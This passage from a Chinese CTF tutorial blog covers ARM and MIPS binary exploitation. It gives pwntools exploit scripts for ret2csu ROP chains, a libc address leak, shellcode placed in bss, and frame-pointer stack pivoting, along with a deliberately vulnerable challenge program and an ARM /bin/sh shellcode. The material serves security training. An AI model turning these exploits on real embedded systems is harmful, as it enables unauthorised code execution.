<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arm_csu</span>(<span class="params">call,u_gadget1,u_gadget2,r0,r1,r2</span>):</span></span><br><span class="line">    payload = p32(u_gadget1)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(call) <span class="comment">#[r5]-&gt;r3  blx r3</span></span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(r0)</span><br><span class="line">    payload += p32(r1)</span><br><span class="line">    payload += p32(r2)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(u_gadget2)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">u_gadget1 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x54</span></span><br><span class="line">u_gadget2 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(system_got,u_gadget1,u_gadget2,binsh_addr,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>



<p>这个是基于调用了system函数，所以system函数中的Got表中已经有了函数地址，同样的，当没有时需要泄露地址，通常调用puts函数或者printf函数即可泄露地址，如下相关脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = &quot;A&quot;*0x10</span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(printf_got,u_gadget1,u_gadget2,printf_got,0,0)</span><br><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">#mulArchDbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32Leakbase(0)</span><br><span class="line">libc.address = printf_addr - libc.sym[&#x27;printf&#x27;]</span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh_addr = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">lg(&quot;system_addr&quot;,system_addr)</span><br><span class="line">lg(&quot;binsh_addr&quot;,binsh_addr) </span><br></pre></td></tr></table></div></figure>

<p>控制返回地址进入u_gadget1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png" alt="image-20211105110402858"></p>
<p>然后控制R4~R10寄存器，跳转u_gadget2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png" alt="image-20211105110734269"></p>
<p>然后跳转got表中函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png" alt="image-20211105110946942"></p>
<p>这里在调用CSU时也需要控制R6和R4，依据<code>CMP     R6, R4</code>，使得之后的<code>BNE     loc_10624</code>短跳转不成立，进入到csu中的最后的<code>POP     &#123;R4-R10,PC&#125;</code>语句，这时候再将栈控好，就能返回到start函数重新开始了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png" alt="image-20211105112027065"></p>
<p>现在的栈在我们最开始的时候已经通过以下语句控制好了，pop之后即可控制pc进入start函数重新开始。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br></pre></td></tr></table></div></figure>

<p>泄露地址之后，如果程序中没有调用system，那么依然也无法通过ret2csu来getshell，但是可以通过下列的来代替：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; 	#pop_R4_R10_PC</span><br><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br><span class="line">mov r0, r7 ; blx r3						#movR0_R7_BLR3</span><br></pre></td></tr></table></div></figure>

<p>而<code>pop_R4_R10_PC</code>和<code>movR0_R7_BLR3</code>都是csu中的，<code>pop_r3_pc</code>则非常常用，基本都有。</p>
<p>这个就是先控R7，在控R3，最后R7赋给R0，跳转R3调用想调用的函数，这里就是<code>system(&#39;/bin/sh&#39;)</code>。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_R4_R10_PC)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r4</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r5</span></span><br><span class="line">payload += p32(<span class="number">0</span>) 				<span class="comment">#r6</span></span><br><span class="line">payload += p32(binsh_addr)      <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r8</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r9</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r10</span></span><br><span class="line">payload += p32(pop_r3_pc)      	<span class="comment">#r3</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(movR0_R7_BLR3)</span><br></pre></td></tr></table></div></figure>

<p>这里的system函数地址就得是泄露的真实地址了，因为赋值过程是直接寄存器赋值，而不是取寄存器值为地址再取值了。</p>
<p>这里的fake_FP基本没有什么用，但是下面介绍的就会有用了。</p>

        <h5 id="B-溢出字节受到限制"   >
          <a href="#B-溢出字节受到限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-溢出字节受到限制" class="headerlink" title="B.溢出字节受到限制"></a>B.溢出字节受到限制</h5>
      <p>当溢出字节受到限制，比如只能溢出0x10个字节时。</p>
<p>参照inctf2018-warmup题目</p>

        <h6 id="a-利用read函数-shellcode"   >
          <a href="#a-利用read函数-shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-利用read函数-shellcode" class="headerlink" title="a.利用read函数+shellcode"></a>a.利用read函数+shellcode</h6>
      <p>当调用了read函数时，且该arm架构使用qemu模拟，那么bss段基本都是可执行的。(具体原因未知)</p>
<p>那么调用read函数一般都是如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010540                 MOV     R2, #0x100      ; nbytes</span><br><span class="line">.text:00010544                 MOV     R1, R3          ; buf</span><br><span class="line">.text:00010548                 MOV     R0, #0          ; fd</span><br><span class="line">.text:0001054C                 BL      read</span><br></pre></td></tr></table></div></figure>

<p>这里就可以通过赋值给buf的语句来劫持R1，将shellcode读取到我们想放置的位置，当然，这之前还是得劫持R3寄存器，不过这个直接通过很常用的gadget即可。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br></pre></td></tr></table></div></figure>

<p>那么如下所示</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr = bss_addr + <span class="number">0x4</span></span><br><span class="line">fake_FP = bss_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_r3_pc)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(read_gadget)</span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png" alt="image-20211105115257258"></p>
<p>这样即可读取shellcode到bss段了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png" alt="image-20211105115432342"></p>
<p>不过这也需要原本的读取函数设置的buf长度足够放下我们的shellcode才行，已经成功读取</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png" alt="image-20211105115637472"></p>
<p>这里的fake_FP就起作用了，因为我们劫持了FP，所以在myFunc函数，即存在溢出函数返回时，通过</p>
<p><code>SUB     SP, R11, #4</code>将FP减4之后赋值给SP，就能劫持栈了，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png" alt="image-20211105120320963"></p>
<p>之后再通过<code>POP     &#123;R11,PC&#125;</code>，劫持PC，进入到shellcode执行。需要注意的是这里由于是pop给PC，所以bss段上还是需要放上对应shellcode处的地址，所以发送shellcode的语句为</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br></pre></td></tr></table></div></figure>

<p>最后成功getshell。</p>

        <h4 id="🔺存在PIE时"   >
          <a href="#🔺存在PIE时" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺存在PIE时" class="headerlink" title="🔺存在PIE时"></a>🔺存在PIE时</h4>
      <p>这种一般都是需要结合爆破来进行了，或者题目本身泄露地址。</p>

        <h2 id="3-叶子函数溢出"   >
          <a href="#3-叶子函数溢出" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-叶子函数溢出" class="headerlink" title="3.叶子函数溢出"></a>3.叶子函数溢出</h2>
      
        <h3 id="1-栈模型-1"   >
          <a href="#1-栈模型-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-栈模型-1" class="headerlink" title="(1)栈模型"></a>(1)栈模型</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | &lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>但是这样就不好利用，只能劫持到上一层函数的函数栈，那么通常会尝试劫持栈迁移一段距离，使得上一个非叶子函数的剩下的汇编代码所用到的栈上数据是我们伪造的栈中的数据，这样就能完成劫持上一个非叶子函数的返回地址。</p>

        <h3 id="2-题目：-1"   >
          <a href="#2-题目：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-题目：-1" class="headerlink" title="(2)题目："></a>(2)题目：</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">(<span class="keyword">char</span>* nameSrc,<span class="keyword">int</span> amount,<span class="keyword">int</span>* i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        name[i[<span class="number">0</span>]] = nameSrc[i[<span class="number">0</span>]];</span><br><span class="line">        i[<span class="number">0</span>] = i[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>( i[<span class="number">0</span>] == amount)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,bss,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">    myFunc(bss,<span class="built_in">strlen</span>(bss),i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-利用：-1"   >
          <a href="#3-利用：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用：-1" class="headerlink" title="(3)利用："></a>(3)利用：</h3>
      <p>直接劫持Last FP，然后利用上一层函数返回时劫持栈，在栈上保存shellcode地址，直接进入shellcode即可getshell。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr =  bss_addr + <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>pop {fp}之后已经劫持栈到bss段上了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png" alt="image-20211106220025308"></p>
<p>返回main函数之后，利用main函数中的返回指令<code>sub sp,fp,#4</code>完成栈劫持</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png" alt="image-20211106220242850"></p>
<p>然后就利用<code>pop &#123;fp, pc&#125;</code>来劫持返回地址，进入到我们输入的bss段上shellcode的地方</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png" alt="image-20211106221534722"></p>

        <h4 id="注："   >
          <a href="#注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#注：" class="headerlink" title="注："></a>注：</h4>
      <p>不在bss段上时，我们劫持完Last FP，返回上一层函数栈中时，当溢出长度足够，可直接修改上一层函数栈中的数据，相当于就是非叶子函数的溢出了。</p>
<p>至于溢出长度不够，只能劫持Last FP的时候，又无法泄露地址，感觉不太能搞，或者上上一层函数中有剩下可利用的数据，那么就部分劫持Last FP，利用上上一层函数中剩下的汇编来getshell，这个具体看题目。</p>

        <h2 id="4-格式化字符串"   >
          <a href="#4-格式化字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-格式化字符串" class="headerlink" title="4.格式化字符串"></a>4.格式化字符串</h2>
      <p>arm架构下的格式化字符串泄露的顺序是R1,R2,R3,栈，其他的相关利用方式也是类似，不再多说。</p>

        <h2 id="5-堆"   >
          <a href="#5-堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-堆" class="headerlink" title="5.堆"></a>5.堆</h2>
      <p>堆的利用方法也是类似的。</p>
<p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112#h3-20" >ARM架构下的 Pwn 的一般解决思路 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="Shellcode"   >
          <a href="#Shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *SC =      <span class="string">&quot;\x01\x30\x8f\xe2&quot;</span></span><br><span class="line">                <span class="string">&quot;\x13\xff\x2f\xe1&quot;</span></span><br><span class="line">                <span class="string">&quot;\x78\x46\x0e\x30&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\x90\x49\x1a&quot;</span></span><br><span class="line">                <span class="string">&quot;\x92\x1a\x08\x27&quot;</span></span><br><span class="line">                <span class="string">&quot;\xc2\x51\x03\x37&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\xdf\x2f\x62&quot;</span></span><br><span class="line">                <span class="string">&quot;\x69\x6e\x2f\x2f&quot;</span></span><br><span class="line">                <span class="string">&quot;\x73\x68&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> payload[<span class="number">34</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(payload, SC, <span class="number">34</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Length: %d\n&quot;</span>, <span class="built_in">strlen</span>(SC));</span><br><span class="line">    (*(<span class="keyword">void</span>(*)()) payload) ();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="三、MIPS"   >
          <a href="#三、MIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、MIPS" class="headerlink" title="三、MIPS"></a>三、MIPS</h1>
      <p>主要介绍mipsel架构的，小端序，大端的mips很少考到，而且也基本都是大同小异</p>

        <h2 id="1-流水线特点"   >
          <a href="#1-流水线特点" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-流水线特点" class="headerlink" title="1.流水线特点"></a>1.流水线特点</h2>
      <p>以下指令的，strchr 函数的参数来自 $s0 而不是 $s2</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $a0, $s2;</span><br><span class="line">jalr strchr;</span><br><span class="line">move $a0, $s0;</span><br></pre></td></tr></table></div></figure>


        <h2 id="🔺注：流水线"   >
          <a href="#🔺注：流水线" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：流水线" class="headerlink" title="🔺注：流水线"></a>🔺注：流水线</h2>
      <p>即跳转之前会先一步加载下一条指令，所以在寻找ROP时，注意看下一步指令都是什么，不然跳转过去参数或者栈帧都有可能会出错的。</p>
<p>但是因为通常PWN题的MIPS通常是用qemu的user模式运行的，这个可能导致指令流水有时候表现不出来，所以不没有调用函数sleep(1)去将数据区刷新到指令区域也是可以拿到shell的；但是如果题目使用system模式部署，添加调用函数刷新数据区域再跳转到shellcode就很必要了，但如果是ROP来getshell倒是不用刷新数据。</p>

        <h2 id="2-栈机制"   >
          <a href="#2-栈机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-栈机制" class="headerlink" title="2.栈机制"></a>2.栈机制</h2>
      
        <h3 id="函数调用"   >
          <a href="#函数调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A14                 la      $t9, sobj_del</span><br><span class="line">.text:00409A18                 nop</span><br><span class="line">.text:00409A1C                 jalr    $t9 ; sobj_del</span><br><span class="line">.text:00409A20                 move    $a0, $s5</span><br><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure>

<p>常见于库函数</p>
<ul>
<li><p>通过<code>$t9</code>来跳转</p>
</li>
<li><p>跳转指令为<code>jalr</code>，保存返回地址到<code>$ra</code>，这里的返回地址即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure></li>
<li><p>由于五级流水线，所以通常在跳转指令下一条指令加载参数，这里即为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A20                 move    $a0, $s5</span><br></pre></td></tr></table></div></figure>

<p>当然如果涉及到多个参数就会提前加载了</p>
</li>
</ul>

        <h3 id="函数栈加载"   >
          <a href="#函数栈加载" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数栈加载" class="headerlink" title="函数栈加载"></a>函数栈加载</h3>
      
        <h4 id="叶子函数"   >
          <a href="#叶子函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h4>
      <p>叶子函数不需要将返回地址保存到栈上，所以一般只需要将参数放入栈中</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//栈空间开辟</span><br><span class="line">.text:00400834                 addiu   $sp, -0x30</span><br><span class="line">//栈指针设置</span><br><span class="line">.text:00400838                 sw      $fp, 0x2C+var_s0($sp)</span><br><span class="line">.text:0040083C                 move    $fp, $sp</span><br><span class="line">//参数入栈</span><br><span class="line">.text:00400840                 sw      $a0, 0x2C+test($fp)</span><br></pre></td></tr></table></div></figure>

<p>有的也会有关于<code>$gp</code>指针的设置，一般是用到了全局变量，常量什么的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br></pre></td></tr></table></div></figure>


        <h4 id="非叶子函数"   >
          <a href="#非叶子函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h4>
      <p>非叶子函数需要将返回地址保存到栈上</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">//栈空间开辟</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class="line">.text:0040948C                 sw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409490                 sw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">//返回地址$ra入栈</span><br></pre></td></tr></table></div></figure>


        <h3 id="函数返回"   >
          <a href="#函数返回" class="heading-link"><i class="fas fa-link"></i></a><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h3>
      
        <h4 id="叶子函数-1"   >
          <a href="#叶子函数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#叶子函数-1" class="headerlink" title="叶子函数"></a>叶子函数</h4>
      <p>叶子函数直接通过<code>$ra</code>寄存器返回</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//....一些参数加载</span><br><span class="line">.text:00409A54                 jr      $ra</span><br><span class="line">//栈空间销毁</span><br><span class="line">.text:00409A58                 addiu   $sp, 0x4E8</span><br></pre></td></tr></table></div></figure>


        <h4 id="非叶子函数-1"   >
          <a href="#非叶子函数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#非叶子函数-1" class="headerlink" title="非叶子函数"></a>非叶子函数</h4>
      <p>非叶子函数需要从栈中获取返回地址到<code>$ra</code>寄存器，然后也是通过<code>$ra</code>寄存器返回</p>
